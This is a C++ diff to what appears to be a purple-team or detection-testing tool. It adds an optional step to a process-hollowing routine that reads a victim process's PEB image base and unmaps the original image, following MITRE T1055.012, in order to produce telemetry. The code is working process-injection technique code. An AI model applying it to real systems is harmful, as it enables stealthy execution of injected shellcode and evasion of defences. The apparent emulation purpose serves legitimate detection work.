@@ -55,13 +55,26 @@ namespace PT::SectionInjection {
 			PVOID  BaseAddress
 		);
 
+		// NtQueryInformationProcess with ProcessBasicInformation gives us the
+		// PEB address for the victim. We then read PEB.ImageBaseAddress to
+		// find where the original .exe image is mapped, so we can unmap it
+		// (matching the MITRE T1055.012 hollowing recipe).
+		typedef NTSTATUS (NTAPI *Fn_NtQueryInformationProcess)(
+			HANDLE           ProcessHandle,
+			PROCESSINFOCLASS ProcessInformationClass,
+			PVOID            ProcessInformation,
+			ULONG            ProcessInformationLength,
+			PULONG           ReturnLength
+		);
+
 		// One-time resolver — grabs ntdll addresses on first use. Cached in
 		// function-local statics so the resolution happens exactly once per
 		// process lifetime, thread-safely (magic-static init in C++11+).
 		struct NtApis {
-			Fn_NtCreateSection      NtCreateSection      = nullptr;
-			Fn_NtMapViewOfSection   NtMapViewOfSection   = nullptr;
-			Fn_NtUnmapViewOfSection NtUnmapViewOfSection = nullptr;
+			Fn_NtCreateSection           NtCreateSection           = nullptr;
+			Fn_NtMapViewOfSection        NtMapViewOfSection        = nullptr;
+			Fn_NtUnmapViewOfSection      NtUnmapViewOfSection      = nullptr;
+			Fn_NtQueryInformationProcess NtQueryInformationProcess = nullptr;
 			bool ok = false;
 		};
 
@@ -76,10 +89,50 @@ namespace PT::SectionInjection {
 					GetProcAddress(ntdll, "NtMapViewOfSection"));
 				a.NtUnmapViewOfSection = reinterpret_cast<Fn_NtUnmapViewOfSection>(
 					GetProcAddress(ntdll, "NtUnmapViewOfSection"));
+				a.NtQueryInformationProcess = reinterpret_cast<Fn_NtQueryInformationProcess>(
+					GetProcAddress(ntdll, "NtQueryInformationProcess"));
+				// NtQueryInformationProcess is used by our unmap step (best-
+				// effort) so we don't fail resolution if it's missing — but we
+				// do require the three core section-mapping APIs.
 				a.ok = (a.NtCreateSection && a.NtMapViewOfSection && a.NtUnmapViewOfSection);
 				return a;
 			}();
 			return apis;
+		}
+
+		// Resolve the victim's original image base by reading its PEB.
+		// Returns 0 on failure (falls back to skipping the unmap step, which
+		// keeps the hollow "no-unmap" variant working — some real hollowing
+		// implementations deliberately skip unmap for stealth).
+		//
+		// PEB layout: ImageBaseAddress is at PEB offset 0x10 on x64 and 0x08
+		// on x86. We read a single pointer-sized value.
+		std::uintptr_t resolve_victim_image_base(HANDLE victim_process) {
+			const auto& nt = nt_apis();
+			if (!nt.NtQueryInformationProcess) return 0;
+
+			PROCESS_BASIC_INFORMATION pbi{};
+			ULONG rlen = 0;
+			NTSTATUS st = nt.NtQueryInformationProcess(
+				victim_process, ProcessBasicInformation,
+				&pbi, sizeof(pbi), &rlen);
+			if (!NT_SUCCESS(st) || pbi.PebBaseAddress == nullptr) return 0;
+
+#ifdef _WIN64
+			constexpr SIZE_T IMAGE_BASE_OFFSET = 0x10;
+#else
+			constexpr SIZE_T IMAGE_BASE_OFFSET = 0x08;
+#endif
+			std::uintptr_t image_base = 0;
+			SIZE_T bytes_read = 0;
+			if (!ReadProcessMemory(
+					victim_process,
+					reinterpret_cast<const char*>(pbi.PebBaseAddress) + IMAGE_BASE_OFFSET,
+					&image_base, sizeof(image_base), &bytes_read)
+				|| bytes_read != sizeof(image_base)) {
+				return 0;
+			}
+			return image_base;
 		}
 
 		// ---------------------------------------------------------------------
@@ -152,7 +205,8 @@ namespace PT::SectionInjection {
 	}  // anonymous namespace
 
 	std::optional<SectionHollowOutcome> install_section_mapped_hollowing(
-		const std::wstring& victim_exe_path)
+		const std::wstring& victim_exe_path,
+		bool unmap_original_image)
 	{
 		const auto& nt = nt_apis();
 		if (!nt.ok) {
@@ -182,6 +236,37 @@ namespace PT::SectionInjection {
 				"[section-hollow] CreateProcessW failed: err=%lu path='%ls'\n",
 				GetLastError(), victim_exe_path.c_str());
 			return std::nullopt;
+		}
+
+		// ---- 1.5. (Optional) Unmap the victim's original image ------------
+		// MITRE T1055.012's classical hollowing recipe includes this step.
+		// Fires KERNEL_THREATINT_TASK_UNMAPVIEW cross-process — a
+		// distinctive syscall in the hollowing fingerprint. Gated behind
+		// unmap_original_image because on Windows 11 24H2 this step
+		// disrupts the SetThreadContext+ResumeThread sequence that follows
+		// (the shellcode never actually executes when the original image
+		// has been unmapped — likely due to changes in the initial-thread
+		// startup path that references PEB.ImageBaseAddress). Modern
+		// "no-unmap" hollowing variants deliberately skip this for
+		// reliability, which is why we default to skipping too. Enable
+		// via --unmap-original for MITRE-aligned syscall coverage even if
+		// runtime shellcode execution fails.
+		if (unmap_original_image) {
+			std::uintptr_t victim_image_base = resolve_victim_image_base(pi.hProcess);
+			if (victim_image_base != 0) {
+				NTSTATUS unmap_st = nt.NtUnmapViewOfSection(
+					pi.hProcess, reinterpret_cast<PVOID>(victim_image_base));
+				std::fprintf(stderr,
+					"[section-hollow] NtUnmapViewOfSection(victim original image at 0x%p) "
+					"→ NTSTATUS=0x%08lX%s\n",
+					reinterpret_cast<void*>(victim_image_base),
+					static_cast<unsigned long>(unmap_st),
+					NT_SUCCESS(unmap_st) ? " (OK — shellcode may not run, syscall recorded)" : " (failed)");
+			} else {
+				std::fprintf(stderr,
+					"[section-hollow] --unmap-original requested but PEB read failed; "
+					"proceeding without unmap\n");
+			}
 		}
 
 		// ---- 2. Create a shared section (pagefile-backed, RWX) -------------
